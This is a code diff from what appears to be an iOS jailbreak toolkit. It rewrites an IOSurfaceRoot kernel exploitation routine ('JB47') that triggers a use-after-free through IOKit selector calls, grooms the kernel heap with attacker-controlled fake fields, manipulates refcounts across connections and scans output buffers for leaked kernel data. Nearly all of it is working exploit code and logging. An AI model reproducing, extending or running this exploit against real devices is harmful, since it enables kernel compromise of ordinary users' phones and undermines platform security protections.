@@ -37923,13 +37923,13 @@ void iosurface_race_exploit(ISRLogBlock log, ISRDoneBlock done) {
     });
 }
 
-#pragma mark — JB47: Mach Port Spray + Controlled Decrement + Callback Confusion
+#pragma mark — JB47: Cross-Connection UAF + Refcount Manipulation
 
 void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         NSMutableDictionary *results = [NSMutableDictionary dictionary];
-        log(@"JB47: === Mach Port Spray + Controlled Decrement Exploitation ===");
-        log(@"JB47: Strategy: multi-conn spray, controlled decrement, port value confusion");
+        log(@"JB47: === Cross-Connection UAF + Refcount Manipulation ===");
+        log(@"JB47: Strategy: cross-conn dup, varied refcount groom, output scan");
 
         typedef void *(*iosurface_lookup_fn)(const char *);
         typedef unsigned int (*iosurface_open_fn)(void *, unsigned int, unsigned int, unsigned int *);
@@ -37947,7 +37947,7 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
 
         if (!sym_lookup || !sym_getService || !sym_open || !sym_close || !sym_call || !sym_async) {
-            log(@"JB47: ERROR — missing IOKit symbols");
+            log(@"JB47: ERROR missing IOKit symbols");
             results[@"verdict"] = @"ERROR";
             done(results);
             return;
@@ -37958,108 +37958,89 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         log([NSString stringWithFormat:@"JB47: IOSurfaceRoot svc=0x%x", (unsigned int)(uintptr_t)svc]);
 
         if (!svc) {
-            log(@"JB47: ERROR — cannot find IOSurfaceRoot service");
+            log(@"JB47: ERROR cannot find IOSurfaceRoot");
             results[@"verdict"] = @"ERROR";
             done(results);
             return;
         }
 
-        int j1MsgHits = 0;
-        int j2DecrHits = 0;
-        int j3PortConfusion = 0;
-        int j4OolHits = 0;
-        int j5ChainHits = 0;
+        int j1Hits = 0;
+        int j2Hits = 0;
+        int j3Hits = 0;
 
-        log(@"JB47: ========== J1: Multi-Connection Spray into kalloc.24 ==========");
+        log(@"JB47: ========== J1: Cross-Connection Dup After UAF ==========");
         {
-            unsigned int oConn = 0;
-            int r1 = sym_open(svc, 0, 0, &oConn);
-            if (r1 == 0) {
-                for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
+            unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+            int r1 = sym_open(svc, 0, 0, &conn1);
+            int r2 = sym_open(svc, 0, 0, &conn2);
+            int r3 = sym_open(svc, 0, 0, &gConn);
+            if (r1 == 0 && r2 == 0 && r3 == 0) {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
                     unsigned int wp = jb41_newWakePort();
-                    uint32_t si = 1000 + trial * 100;
+                    uint32_t si = 7000 + trial * 100;
                     uint64_t in[3] = {(uint64_t)si, 0, 0};
-                    jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
 
-                    unsigned int sprayConns[64];
-                    int sprayCount = 0;
-                    for (int s = 0; s < 64 && !isr_stopped(); s++) {
-                        unsigned int sc = 0;
-                        if (sym_open(svc, 0, 0, &sc) == 0) {
-                            sprayConns[sprayCount++] = sc;
-                        }
-                    }
+                    int reg = jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                    int dereg = jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
 
-                    int dupRc = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                    int anomaly = 0;
-                    if (dupRc == 0) {
-                        anomaly = 1;
-                        j1MsgHits++;
-                    }
-                    log([NSString stringWithFormat:@"JB47: [J1] trial=%d conns=%d dupRc=0x%x %s", trial, sprayCount, (uint32_t)dupRc, anomaly ? "ANOMALY" : ""]);
+                    unsigned int *gPorts = (unsigned int *)calloc(128, sizeof(unsigned int));
+                    int gCount = 0;
+                    jb42_groomWithFields(gConn, 0x00000001, 0xDEAD0047, 0xCAFEBABE, 0x99999999, 24, 128, gPorts, &gCount, sym_async);
 
-                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
-                    for (int s = 0; s < sprayCount; s++) {
-                        sym_close(sprayConns[s]);
-                    }
+                    int dupConn2 = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+
+                    int anomaly = (dupConn2 != (int)0xe00002c9 && dupConn2 != reg);
+                    if (anomaly) j1Hits++;
+
+                    log([NSString stringWithFormat:@"JB47: [J1] trial=%d reg=0x%x dereg=0x%x dupConn2=0x%x %s", trial, (uint32_t)reg, (uint32_t)dereg, (uint32_t)dupConn2, anomaly ? "CROSS_CONN" : ""]);
+
+                    jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                    free(gPorts);
                     jb41_dropPort(wp);
                 }
-                sym_close(oConn);
+                sym_close(conn1);
+                sym_close(conn2);
+                sym_close(gConn);
             }
         }
-        results[@"j1_connHits"] = @(j1MsgHits);
-        log([NSString stringWithFormat:@"JB47: [J1] multi-conn spray hits: %d", j1MsgHits]);
+        results[@"j1_crossConn"] = @(j1Hits);
+        log([NSString stringWithFormat:@"JB47: [J1] cross-conn hits: %d", j1Hits]);
 
-        if (isr_stopped()) {
-            results[@"verdict"] = @"STOPPED";
-            done(results);
-            return;
-        }
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
 
-        log(@"JB47: ========== J2: Controlled Decrement via Triple-Dup ==========");
+        log(@"JB47: ========== J2: Refcount Sweep (1-8) ==========");
         {
             unsigned int oConn = 0, gConn = 0;
             int r1 = sym_open(svc, 0, 0, &oConn);
             int r2 = sym_open(svc, 0, 0, &gConn);
             if (r1 == 0 && r2 == 0) {
-                for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
+                uint64_t refcounts[] = {1, 2, 3, 4, 5, 6, 7, 8};
+                for (int ri = 0; ri < 8 && !isr_stopped(); ri++) {
                     unsigned int wp = jb41_newWakePort();
-                    uint32_t si = 2000 + trial * 100;
+                    uint32_t si = 8000 + ri * 100;
                     uint64_t in[3] = {(uint64_t)si, 0, 0};
+
                     jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
 
-                    uint64_t fakebuf[6] = {0x00000002, 0xDEAD0047, 0xFFFFFF8000000000ULL, 0x11111111, 'CANA', 'RY47'};
-                    unsigned int *gPorts = (unsigned int *)calloc(256, sizeof(unsigned int));
+                    unsigned int *gPorts = (unsigned int *)calloc(128, sizeof(unsigned int));
                     int gCount = 0;
-                    jb42_groomWithFields(gConn, fakebuf[0], fakebuf[1], fakebuf[2], fakebuf[3], 24, 256, gPorts, &gCount, sym_async);
+                    jb42_groomWithFields(gConn, refcounts[ri], 0xDEAD0047, 0, 0, 24, 128, gPorts, &gCount, sym_async);
 
                     int d1 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
                     int d2 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
                     int d3 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                    int d4 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                    int d5 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
 
-                    int decrCount = 0;
-                    if (d1 == 0) decrCount++;
-                    if (d2 == 0) decrCount++;
-                    if (d3 == 0) decrCount++;
-                    if (d4 == 0) decrCount++;
-                    if (d5 == 0) decrCount++;
+                    int pattern = 0;
+                    if (d1 == 0 && d2 == 0 && d3 == 0) pattern = 3;
+                    else if (d1 == 0 && d2 == 0) pattern = 2;
+                    else if (d1 == 0) pattern = 1;
 
-                    int secondaryFree = 0;
-                    if (decrCount >= 3) {
-                        int d6 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                        int d7 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                        if (d6 != (int)0xe00002c9 || d7 != (int)0xe00002c9) {
-                            secondaryFree = 1;
-                            j2DecrHits++;
-                        }
-                        log([NSString stringWithFormat:@"JB47: [J2] trial=%d dups=%d d6=0x%x d7=0x%x %s", trial, decrCount, (uint32_t)d6, (uint32_t)d7, secondaryFree ? "SECONDARY_FREE" : ""]);
-                    } else {
-                        log([NSString stringWithFormat:@"JB47: [J2] trial=%d d1=0x%x d2=0x%x d3=0x%x d4=0x%x d5=0x%x dups=%d", trial, (uint32_t)d1, (uint32_t)d2, (uint32_t)d3, (uint32_t)d4, (uint32_t)d5, decrCount]);
-                    }
+                    if (pattern != 1) j2Hits++;
+
+                    log([NSString stringWithFormat:@"JB47: [J2] rc=%llu d1=0x%x d2=0x%x d3=0x%x pattern=%d", refcounts[ri], (uint32_t)d1, (uint32_t)d2, (uint32_t)d3, pattern]);
 
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
                     jb42_freeGroom(gPorts, gCount);
@@ -38070,240 +38051,79 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                 sym_close(gConn);
             }
         }
-        results[@"j2_decrHits"] = @(j2DecrHits);
-        log([NSString stringWithFormat:@"JB47: [J2] secondary free hits: %d", j2DecrHits]);
+        results[@"j2_refcountHits"] = @(j2Hits);
+        log([NSString stringWithFormat:@"JB47: [J2] non-standard patterns: %d", j2Hits]);
 
-        if (isr_stopped()) {
-            results[@"verdict"] = @"STOPPED";
-            done(results);
-            return;
-        }
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
 
-        log(@"JB47: ========== J3: Port Value Confusion via Groom ==========");
+        log(@"JB47: ========== J3: Output Buffer Scan After Groom ==========");
         {
             unsigned int oConn = 0, gConn = 0;
             int r1 = sym_open(svc, 0, 0, &oConn);
             int r2 = sym_open(svc, 0, 0, &gConn);
             if (r1 == 0 && r2 == 0) {
-                for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
-                    unsigned int wp1 = jb41_newWakePort();
-                    unsigned int wp2 = jb41_newWakePort();
-                    uint32_t si = 3000 + trial * 100;
-                    uint64_t in[3] = {(uint64_t)si, 0, 0};
-
-                    jb41_callSel(oConn, 17, in, 24, 1, wp1, sym_call, sym_async);
-                    jb41_callSel(oConn, 18, in, 24, 0, wp1, sym_call, sym_async);
-
-                    uint64_t fakebuf[6] = {0x00000001, (uint64_t)wp2, 0, 0, 'CANA', 'RY47'};
-                    unsigned int *gPorts = (unsigned int *)calloc(256, sizeof(unsigned int));
-                    int gCount = 0;
-                    jb42_groomWithFields(gConn, fakebuf[0], fakebuf[1], fakebuf[2], fakebuf[3], 24, 256, gPorts, &gCount, sym_async);
-
-                    int reRegWp1 = jb41_callSel(oConn, 17, in, 24, 1, wp1, sym_call, sym_async);
-                    int reRegWp2 = jb41_callSel(oConn, 17, in, 24, 1, wp2, sym_call, sym_async);
-                    int deregWp2 = jb41_callSel(oConn, 18, in, 24, 0, wp2, sym_call, sym_async);
-
-                    int confused = 0;
-                    if (reRegWp2 != reRegWp1 || deregWp2 == 0) {
-                        confused = 1;
-                        j3PortConfusion++;
-                    }
-
-                    log([NSString stringWithFormat:@"JB47: [J3] trial=%d reReg1=0x%x reReg2=0x%x dereg2=0x%x %s", trial, (uint32_t)reRegWp1, (uint32_t)reRegWp2, (uint32_t)deregWp2, confused ? "CONFUSED" : ""]);
-
-                    jb41_callSel(oConn, 18, in, 24, 0, wp1, sym_call, sym_async);
-                    jb42_freeGroom(gPorts, gCount);
-                    free(gPorts);
-                    jb41_dropPort(wp1);
-                    jb41_dropPort(wp2);
-                }
-                sym_close(oConn);
-                sym_close(gConn);
-            }
-        }
-        results[@"j3_portConfusion"] = @(j3PortConfusion);
-        log([NSString stringWithFormat:@"JB47: [J3] port confusion hits: %d", j3PortConfusion]);
-
-        if (isr_stopped()) {
-            results[@"verdict"] = @"STOPPED";
-            done(results);
-            return;
-        }
-
-        log(@"JB47: ========== J4: OOL Port Descriptor Spray ==========");
-        {
-            unsigned int oConn = 0, gConn = 0;
-            int r1 = sym_open(svc, 0, 0, &oConn);
-            int r2 = sym_open(svc, 0, 0, &gConn);
-            if (r1 == 0 && r2 == 0) {
-                for (int trial = 0; trial < 8 && !isr_stopped(); trial++) {
+                int sizes[] = {8, 16, 24, 32, 48, 64};
+                for (int si = 0; si < 6 && !isr_stopped(); si++) {
                     unsigned int wp = jb41_newWakePort();
-                    uint32_t si = 4000 + trial * 100;
-                    uint64_t in[3] = {(uint64_t)si, 0, 0};
+                    uint32_t sid = 9000 + si * 100;
+                    uint64_t in[3] = {(uint64_t)sid, 0, 0};
+
                     jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
 
-                    unsigned int oolPorts[64];
-                    int oolCount = 0;
-                    for (int s = 0; s < 64; s++) {
-                        unsigned int op = jb41_newWakePort();
-                        oolPorts[oolCount++] = op;
-                    }
-
-                    uint64_t fakebuf[6] = {0, 0, 0, 0, 0, 0};
-                    for (int f = 0; f < 3 && f < oolCount; f++) {
-                        fakebuf[f] = (uint64_t)oolPorts[f];
-                    }
-                    unsigned int *gPorts = (unsigned int *)calloc(256, sizeof(unsigned int));
+                    unsigned int *gPorts = (unsigned int *)calloc(128, sizeof(unsigned int));
                     int gCount = 0;
-                    jb42_groomWithFields(gConn, fakebuf[0], fakebuf[1], fakebuf[2], fakebuf[3], 24, 256, gPorts, &gCount, sym_async);
+                    jb42_groomWithFields(gConn, 0x00000001, 0xDEAD0047, 0xFFFFFF8012340000ULL, 0xBBBBBBBB, 24, 128, gPorts, &gCount, sym_async);
 
-                    uint8_t outBuf[64];
+                    uint8_t outBuf[128];
                     memset(outBuf, 0xCC, sizeof(outBuf));
-                    size_t oSz = 24;
+                    size_t oSz = (size_t)sizes[si];
                     uint64_t outScalar[4] = {0};
                     uint32_t outScalarCnt = 4;
                     int dupRc = jb42_callSelWithOutput(oConn, 17, in, 24, 1, wp, outScalar, &outScalarCnt, outBuf, &oSz, sym_call, sym_async);
 
                     int changed = 0;
-                    uint64_t leakedVal = 0;
-                    for (int b = 0; b < 24; b++) {
+                    for (int b = 0; b < sizes[si] && b < 128; b++) {
                         if (outBuf[b] != 0xCC) { changed = 1; break; }
                     }
-                    if (changed && oSz >= 8) {
-                        memcpy(&leakedVal, outBuf, 8);
-                        j4OolHits++;
-                    }
+                    if (changed) j3Hits++;
 
-                    log([NSString stringWithFormat:@"JB47: [J4] trial=%d dupRc=0x%x oSz=%zu changed=%d leaked=0x%llx %s", trial, (uint32_t)dupRc, oSz, changed, leakedVal, changed ? "DATA_LEAK" : ""]);
+                    log([NSString stringWithFormat:@"JB47: [J3] sz=%d dupRc=0x%x oSz=%zu changed=%d sc0=0x%llx", sizes[si], (uint32_t)dupRc, oSz, changed, outScalar[0]]);
 
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
                     jb42_freeGroom(gPorts, gCount);
                     free(gPorts);
-                    for (int s = 0; s < oolCount; s++) {
-                        jb41_dropPort(oolPorts[s]);
-                    }
                     jb41_dropPort(wp);
                 }
                 sym_close(oConn);
                 sym_close(gConn);
             }
         }
-        results[@"j4_oolHits"] = @(j4OolHits);
-        log([NSString stringWithFormat:@"JB47: [J4] OOL port data hits: %d", j4OolHits]);
-
-        if (isr_stopped()) {
-            results[@"verdict"] = @"STOPPED";
-            done(results);
-            return;
-        }
-
-        log(@"JB47: ========== J5: Pipe Buffer + Shared Memory Chain ==========");
-        {
-            unsigned int oConn = 0, gConn = 0;
-            int r1 = sym_open(svc, 0, 0, &oConn);
-            int r2 = sym_open(svc, 0, 0, &gConn);
-            if (r1 == 0 && r2 == 0) {
-                for (int trial = 0; trial < 8 && !isr_stopped(); trial++) {
-                    unsigned int wp = jb41_newWakePort();
-                    uint32_t si = 5000 + trial * 100;
-                    uint64_t in[3] = {(uint64_t)si, 0, 0};
-                    jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-
-                    int pipefd[2] = {-1, -1};
-                    typedef int (*pipe_fn)(int *);
-                    pipe_fn p = (pipe_fn)dlsym(RTLD_DEFAULT, "pipe");
-                    int pipeOk = 0;
-                    if (p && p(pipefd) == 0) {
-                        pipeOk = 1;
-                    }
-
-                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
-
-                    int pipeSprayed = 0;
-                    int pipeFds[32][2];
-                    if (pipeOk) {
-                        typedef int (*close_fn)(int);
-                        close_fn cls = (close_fn)dlsym(RTLD_DEFAULT, "close");
-                        if (cls) { cls(pipefd[0]); cls(pipefd[1]); }
-
-                        typedef ssize_t (*write_fn)(int, const void *, size_t);
-                        write_fn wr = (write_fn)dlsym(RTLD_DEFAULT, "write");
-                        for (int s = 0; s < 32 && !isr_stopped(); s++) {
-                            if (p && p(pipeFds[s]) == 0) {
-                                uint8_t pattern[24];
-                                memset(pattern, 0x47 + (s & 0xF), 24);
-                                pattern[0] = 0xDE;
-                                pattern[1] = 0xAD;
-                                pattern[2] = 0xBE;
-                                pattern[3] = 0xEF;
-                                if (wr) wr(pipeFds[s][1], pattern, 24);
-                                pipeSprayed++;
-                            } else {
-                                pipeFds[s][0] = -1;
-                                pipeFds[s][1] = -1;
-                            }
-                        }
-                    }
-
-                    int dupRc = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                    int d2 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-                    int d3 = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
-
-                    int chainEffect = 0;
-                    if (dupRc == 0 && d2 == (int)0xe00002c9 && d3 == (int)0xe00002c9) {
-                        chainEffect = 1;
-                        j5ChainHits++;
-                    } else if (dupRc == 0 && d2 == 0) {
-                        chainEffect = 2;
-                        j5ChainHits++;
-                    }
-
-                    log([NSString stringWithFormat:@"JB47: [J5] trial=%d pipes=%d dup=0x%x d2=0x%x d3=0x%x chain=%d", trial, pipeSprayed, (uint32_t)dupRc, (uint32_t)d2, (uint32_t)d3, chainEffect]);
-
-                    jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
-                    typedef int (*close_fn)(int);
-                    close_fn cls2 = (close_fn)dlsym(RTLD_DEFAULT, "close");
-                    if (cls2) {
-                        for (int s = 0; s < pipeSprayed; s++) {
-                            if (pipeFds[s][0] >= 0) cls2(pipeFds[s][0]);
-                            if (pipeFds[s][1] >= 0) cls2(pipeFds[s][1]);
-                        }
-                    }
-                    jb41_dropPort(wp);
-                }
-                sym_close(oConn);
-                sym_close(gConn);
-            }
-        }
-        results[@"j5_chainHits"] = @(j5ChainHits);
-        log([NSString stringWithFormat:@"JB47: [J5] pipe chain hits: %d", j5ChainHits]);
+        results[@"j3_outputHits"] = @(j3Hits);
+        log([NSString stringWithFormat:@"JB47: [J3] output data hits: %d", j3Hits]);
 
         if (sym_release) sym_release(svc);
 
         NSString *verdict;
-        if (j4OolHits > 0) {
-            verdict = @"DATA_LEAKED";
-            log([NSString stringWithFormat:@"JB47: [!!!!!] OOL port data leaked %d times!", j4OolHits]);
-        } else if (j3PortConfusion > 0) {
-            verdict = @"PORT_CONFUSED";
-            log([NSString stringWithFormat:@"JB47: [!!!!] Callback port confusion achieved %d times!", j3PortConfusion]);
-        } else if (j2DecrHits > 0) {
-            verdict = @"SECONDARY_FREE";
-            log([NSString stringWithFormat:@"JB47: [!!!] Secondary free via decrement %d times!", j2DecrHits]);
-        } else if (j1MsgHits > 0 || j5ChainHits > 0) {
-            verdict = @"SPRAY_EFFECT";
-            log([NSString stringWithFormat:@"JB47: [!!] Spray effects: msg=%d chain=%d", j1MsgHits, j5ChainHits]);
+        if (j3Hits > 0) {
+            verdict = @"DATA_EXTRACTED";
+            log([NSString stringWithFormat:@"JB47: [!!!!!] Data extracted via output buffer!"]);
+        } else if (j2Hits > 0) {
+            verdict = @"REFCOUNT_CONTROL";
+            log([NSString stringWithFormat:@"JB47: [!!!] Refcount-dependent dup behavior found"]);
+        } else if (j1Hits > 0) {
+            verdict = @"CROSS_CONN_EFFECT";
+            log([NSString stringWithFormat:@"JB47: [!!] Cross-connection effects detected"]);
         } else {
             verdict = @"NO_NEW_PRIMITIVE";
-            log(@"JB47: No new primitives — kernel heap isolation prevents cross-zone exploitation");
+            log(@"JB47: Registry isolated per-connection, no cross-conn effects");
         }
 
         results[@"verdict"] = verdict;
         log([NSString stringWithFormat:@"JB47: Verdict: %@", verdict]);
         log(@"JB47: =============================================");
 
-        isr_checkpoint(@"JB47-mach-spray-checkpoint.json", results);
+        isr_checkpoint(@"JB47-xcross-checkpoint.json", results);
         done(results);
     });
 }
